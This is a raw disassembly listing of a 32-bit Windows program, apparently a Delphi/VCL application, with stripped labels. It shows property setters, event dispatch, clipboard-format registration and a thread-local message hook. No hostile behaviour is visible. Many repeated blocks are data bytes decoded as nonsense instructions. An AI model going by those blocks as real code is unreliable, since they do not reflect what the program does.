mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403564
pop esi
retn
sub_42d70c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403564
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42d724
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42d7cd
jmp sub_403ae4
sub_42d7fb
jmp sub_403ae4
sub_42d802
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d80c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42d820
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42da7e
jmp sub_403ae4
sub_42da85
pop ebp
retn
sub_42dcce
inc esp
add al dh
int3
sub_42dcd2
inc esp
add [ eax + 0x500044cb ] ch

sub_42dcda
inc esp
add al cl
test [ eax + eax - 0x3c ] 0x9c004514
or [ ebp ] eax
inc esp
hlt
sub_42de4a
inc esp
add al dh
int3
sub_42de4e
inc esp
add [ eax + 0x500044cb ] ch

sub_42de56
inc esp
add al cl
test [ eax + eax - 0x3c ] 0x9c004514
or [ ebp ] eax
inc esp
hlt
sub_42e472
jmp sub_403830
sub_42e52b
jmp sub_403ae4
sub_42e532
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e538
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42e4ac
sub_42e548
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42e4ac
sub_42e558
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42e4ac
pop ebp
retn 0x8
sub_42e570
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42e676
inc esp
add al dh
int3
sub_42e67a
inc esp
add [ eax + 0x500044cb ] ch

sub_42e682
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_42e80d
jmp sub_403830
sub_42e980
retn
sub_42eb0d
jmp sub_403ae4
sub_42eb90
push ebx
mov ebx eax
mov eax ebx
call sub_44b088
mov eax ebx
call sub_42e984
pop ebx
retn
sub_42eba4
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44b7a8
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42eccc
pop ebx
retn
sub_42ecbc
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42ed95
jmp sub_403ae4
sub_42ed9c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ede4
push ebx
mov ebx eax
mov eax ebx
call sub_44ed10
mov eax ebx
call sub_42e984
pop ebx
retn
sub_42edf8
push ebx
mov ebx eax
mov eax ebx
call sub_43f780
mov eax ebx
call sub_42e984
pop ebx
retn
sub_42ee0c
mov al 0x1
retn
sub_42ee10
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42f148
jmp sub_403ae4
sub_42f14f
pop ebp
retn
sub_42f154
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e68
mov eax [ r-xdata ]
call sub_417ed4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
sub_42f1e1
jmp sub_403ae4
sub_42f1e8
pop ebp
retn
sub_42f1ec
sub [ rw-data ] 0x1
retn
sub_42f225
jmp sub_403ae4
sub_42f22c
pop ebp
retn
sub_42f230
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42f2ac
retn
sub_42f2ad
jmp sub_403ae4
j_sub_42f2ac
jmp sub_42f2ac
sub_42f2b4
pop ebp
retn
sub_42f2b8
sub [ rw-data ] 0x1
retn
sub_42f2c0
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403368
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42f3dd
jmp sub_403ae4
sub_42f3e4
pop ebp
retn
sub_42f3e8
sub [ rw-data ] 0x1
retn
sub_42f444
jmp sub_403ae4
sub_42f44b
pop ebp
retn
sub_42f450
sub [ rw-data ] 0x1
retn
sub_42f4ac
jmp sub_403ae4
sub_42f4b3
pop ebp
retn
sub_42f4b8
sub [ rw-data ] 0x1
retn
sub_42f519
jmp sub_403ae4
sub_42f520
pop ebp
retn
sub_42f524
sub [ rw-data ] 0x1
retn
sub_42f570
jmp sub_403ae4
sub_42f577
pop ebp
retn
sub_42f57c
sub [ rw-data ] 0x1
retn
sub_42f5a9
jmp sub_403ae4
sub_42f5b0
pop ebp
retn
sub_42f5b4
sub [ rw-data ] 0x1
retn
sub_42f9af
jmp [ eax + 0x33 ]
sub_42fdf2
inc esp
add al dh
int3
sub_42fdf6
inc esp
add [ eax - 0x63ffbb35 ] ch
inc ebx
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_430466
inc esp
add al dh
int3
sub_43046a
inc esp
add [ eax - 0x63ffbb35 ] ch
inc ebx
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43171e
inc esp
add al dh
int3
sub_431722
inc esp
add [ eax + 0x500044cb ] ch

sub_43172a
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_432696
inc esp
add [ eax + 0x500044cb ] ch

sub_43269e
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43285e
inc esp
add [ eax + 0x500044cb ] ch

sub_432866
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_433144
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_419274
sub_433158
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_433160
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_433170
sub_4331a8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4331c0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4331fc
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_419274
sub_43322c
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_4332a4
retn
mov edx 0x2710
sub_433250
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_4332a4
retn
mov edx ecx
sub_43326c
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_419274
sub_4332ec
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_419274
sub_433340
or ecx 0xffffffff
xor edx edx
call sub_433390
retn
sub_433360
mov eax [ eax + 0x18 ]
retn
sub_433608
jmp sub_403ae4
sub_43372a
jmp sub_403ae4
sub_433731
mov eax [ ebp - 0x4 ]
call sub_44cb50
pop ecx
pop ecx
pop ebp
retn
sub_4338e6
jmp sub_403ae4
sub_433984
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_4339a4
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_4339f0
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44cd54
sub_433a04
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_44cd54
sub_433a18
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_44cd54
sub_433a2c
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_44cd54
sub_433a40
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_433ced
jmp sub_403ae4
sub_433cf4
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_433e9a
jmp sub_403ae4
sub_434286
jmp sub_403ae4
sub_4342a3
jmp sub_403ae4
sub_4342b4
push ebx
mov ebx eax
mov eax ebx
call sub_44dc90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434504
jmp sub_403ae4
sub_43450b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43452e
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40544c
retn
sub_434527
jmp sub_403ae4
sub_43452e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434590
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_4345e8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4332fc
retn
sub_4345f8
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43460c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_4347c0
call sub_44a508
retn
sub_434dab
adc al 0x2
add [ eax ] al
call sub_436c1c
pop ebx
retn
sub_434eec
mov cl [ eax + 0x17d ]
add cl 0xfd
sub cl 0x2
jae r-xdata
mov al 0x1
cmp [ eax + 0x9b ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
and eax 0x7f
mov [ edx + 0xc ] eax
retn
sub_434f70
cmp edx [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] edx
test edx edx
je r-xdata
xchg edx eax
call sub_421254
sub_434f8c
push esi
mov esi eax
cmp dl [ esi + 0x16b ]
je r-xdata
pop esi
retn
mov [ esi + 0x16b ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x9c ]
sub_4351cc
push esi
mov esi eax
cmp dl [ esi + 0x17c ]
je r-xdata
pop esi
retn
mov [ esi + 0x17c ] dl
cmp [ esi + 0x184 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
sub_4351f4
inc [ eax + 0x180 ]
retn
sub_4351fc
dec [ eax + 0x180 ]
retn
sub_435204
mov edx [ eax + 0x184 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x218 ]
xchg edx eax
call sub_4188fc
retn
sub_435220
mov al [ eax + 0x17d ]
add al 0xfd
sub al 0x2
setb al
retn
sub_435360
mov eax [ r-xdata ]
retn
sub_435903
jmp sub_403ae4
sub_435a83
jmp sub_403ae4
sub_435afe
jmp sub_403ae4
sub_435f5b
jmp sub_403ae4
sub_435f62
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_436143
jmp sub_403ae4
sub_43614a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43623c
jmp sub_403ae4
sub_436243
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e34
retn
sub_436259
jmp sub_403ae4
sub_43633d
jmp sub_403ae4
sub_436344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436e34
retn
sub_43635a
jmp sub_403ae4
sub_436436
jmp sub_403ae4
sub_43643d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43645a
mov eax [ ebp - 0x4 ]
call sub_436e34
retn
sub_436453
jmp sub_403ae4
sub_43645a
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_435a94
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436560
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_44cd54
sub_436574
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
call sub_44cd54
sub_436588
push ebx
mov ebx eax
cmp dl [ ebx + 0x22a ]
je r-xdata
mov [ ebx + 0x22b ] 0x1
pop ebx
retn
mov [ ebx + 0x22a ] dl
mov eax ebx
call sub_44cd54
sub_4365ac
push esi
mov esi eax
cmp dl [ esi + 0x22c ]
je r-xdata
pop esi
retn
mov [ esi + 0x22c ] dl
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax esi
mov si 0xffee
call sub_403564
sub_436719
jmp sub_403ae4
sub_436720
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436796
jmp sub_403ae4
sub_436a90
cmp edx [ eax + 0x248 ]
je r-xdata
retn
mov [ eax + 0x248 ] edx
call sub_44cd54
sub_436bb7
jmp sub_403830
sub_436e2c
inc [ eax + 0x25c ]
retn
sub_436e34
dec [ eax + 0x25c ]
retn
sub_436e78
push 0x0
xor ecx ecx
mov edx 0x418
call sub_44a180
retn
sub_436f49
inc ebp
hlt
sub_437089
jmp sub_403ae4
sub_4371ac
retn
sub_4371b0
cmp [ eax + 0x22a ] 0x0
jne r-xdata
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
call sub_44dc08
retn
sub_4371c8
cmp [ eax + 0x2c9 ] 0x0
je r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_437208
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x21c ]
call sub_404424
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_437ba9
jmp sub_403ae4
sub_437c0c
call sub_4379c4
retn
sub_437d24
push ebx
mov ebx eax
mov eax ebx
call sub_44ece8
mov eax ebx
call sub_44cd54
pop ebx
retn
sub_437d38
push ebx
mov ebx eax
mov eax ebx
call sub_44aba4
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437d78
push ebx
mov ebx eax
mov eax ebx
call sub_44eedc
mov eax ebx
call sub_44cd54
pop ebx
retn
sub_437fc7
jmp sub_403ae4
sub_438352
jmp sub_403ae4
sub_4383ca
jmp sub_403ae4
sub_438a40
jmp sub_403ae4
sub_438a58
retn
sub_438b0b
jmp sub_403ae4
sub_438b12
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438c7c
mov [ eax + 0x224 ] 0x1
retn
sub_439104
cmp [ rw-data ] 0x0
jne r-xdata
retn
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_439078
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
sub_439128
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
sub_43949b
jmp sub_403ae4
sub_4394f9
jmp sub_403ae4
sub_4397e1
jmp sub_403ae4
sub_4397e8
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2d8 ]
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439844
cmp dl [ eax + 0x225 ]
je r-xdata
retn
mov [ eax + 0x225 ] dl
call sub_44cd54
sub_4399fb
jmp sub_403ae4
sub_439a02
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439ab4
cmp dl [ eax + 0x2f0 ]
je r-xdata
retn
mov [ eax + 0x2f0 ] dl
call sub_44cd54
sub_439cd9
jmp sub_403ae4
sub_439ce0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439e94
retn
sub_439f99
jmp sub_403ae4
sub_439fa0
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a08c
mov al [ eax + 0x244 ]
retn
sub_43a094
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43a0b0
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43a0cc
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43a0e8
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43a181
jmp sub_403830
sub_43a404
jmp sub_403ae4
sub_43a40b
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a540
jmp sub_403ae4
sub_43a547
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a7c0
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x10
call sub_433028
sub_43a7e0
cmp dl [ eax + 0x246 ]
je r-xdata
retn
mov [ eax + 0x246 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x8
call sub_433028
sub_43a800
cmp dl [ eax + 0x247 ]
je r-xdata
retn
mov [ eax + 0x247 ] dl
mov ecx edx
mov edx 0x4
call sub_433028
sub_43aa6e
add [ eax ] al
call sub_44f7b4
retn
sub_43ab70
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_43ab84
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43ab98
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_43abac
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_43abc0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_43abdc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43abf8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_43ac14
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_43ac9f
jmp sub_403ae4
sub_43aca6
pop ebp
retn
sub_43aca8
sub [ rw-data ] 0x1
retn
sub_43ad17
jmp [ edi ]
sub_43afb8
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43afd0
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43b014
push ebx
mov ebx eax
mov eax ebx
call sub_43b7d8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43b7c7
jmp sub_403ae4
sub_43b7d8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42c72c
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43afe4
sub_43b82f
jmp sub_403ae4
sub_43b836
pop ebp
retn
sub_43b838
sub [ rw-data ] 0x1
retn
sub_43b932
inc esp
add al dh
int3
sub_43b936
inc esp
add [ eax + 0x500044cb ] ch

sub_43b93e
inc esp
add al cl
test [ eax + eax - 0x3c ] 0x9c004514
or [ ebp ] eax
inc esp
hlt
sub_43baa2
inc esp
add al dh
int3
sub_43baa6
inc esp
add [ eax + 0x500044cb ] ch

sub_43baae
inc esp
add al cl
test [ eax + eax - 0x3c ] 0x9c004514
or [ ebp ] eax
inc esp
hlt
sub_43cc26
inc esp
add [ eax + 0x2 ] bl
inc esp
add [ eax - 0x35 ] dl
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43ce7a
inc esp
add al dh
int3
sub_43ce7e
inc esp
add [ eax + 0x2 ] bl
inc esp
add al dl
adc [ eax + eax - 0x38 ] eax
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43d062
inc esp
add al dh
int3
sub_43d066
inc esp
add [ eax + 0x2 ] bl
inc esp
add al dl
adc [ eax + eax - 0x38 ] eax
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43dafa
inc esp
add al dh
int3
sub_43dafe
inc esp
add [ eax + 0x500044cb ] ch

sub_43db06
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43dbcd
0x44
sub_43dc6e
inc esp
add al dh
int3
sub_43dc72
inc esp
add [ eax + 0x500044cb ] ch

sub_43dc7a
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43e33e
inc esp
add al dh
int3
sub_43e342
inc esp
add [ eax + 0x500044cb ] ch

sub_43e34a
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43eb66
inc esp
add al dh
int3
sub_43eb6a
inc esp
add [ eax + 0x500044cb ] ch

sub_43eb72
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_43f128
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_43f2fb
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2ccd172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43f6b6
jmp sub_403ae4
sub_43f6bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f742
jmp sub_403ae4
sub_43f749
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f750
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44c074
pop ebx
retn
sub_43f764
push ebx
mov ebx eax
mov eax ebx
call sub_44edcc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44c074
pop ebx
retn
sub_43f780
push ebx
mov ebx eax
mov eax ebx
call sub_44dda0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43f82c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448fb4
pop esi
pop ebx
retn
sub_43f996
jmp sub_403ae4
sub_43f99d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43faac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b088
mov eax ebx
mov si 0xffc7
call sub_403564
pop esi
pop ebx
retn
sub_43fb98
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fbb4
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403564
sub_43fbd0
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43fbdc
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_421254
sub_43fbf0
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fc50
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fcc4
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403564
pop esi
pop ebx
retn
sub_43fce0
push esi
mov esi eax
mov eax esi
call sub_44ab94
mov eax esi
mov si 0xffc7
call sub_403564
pop esi
retn
sub_43fd85
jmp sub_403ae4
sub_43fd8c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fd94
push ebx
mov ebx eax
mov eax ebx
call sub_44acf8
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_43fdb8
push ebx
mov ebx eax
mov eax ebx
call sub_44ad10
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43fddc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
pop ebx
retn
sub_43fe5e
jmp sub_403ae4
sub_43fe65
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ff50
jmp sub_403ae4
sub_43ff57
pop ebx
pop ecx
pop ebp
retn
sub_44004b
jmp sub_403ae4
sub_440052
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4400cf
jmp sub_403ae4
sub_4400d6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440133
retn
sub_44022c
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_448f90
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_44027c
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
pop ebx
retn
sub_4403b0
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_44cd54
sub_4403e4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4403ec
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4403f4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_440420
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44a180
sub_440578
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_440598
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_44cd54
sub_440863
jmp sub_403830
sub_440868
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_440af4
jmp sub_403ae4
sub_440afb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440b04
push ebx
mov ebx eax
mov eax ebx
call sub_448bc0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_440bd1
jmp sub_403ae4
sub_440bd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_440be4
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
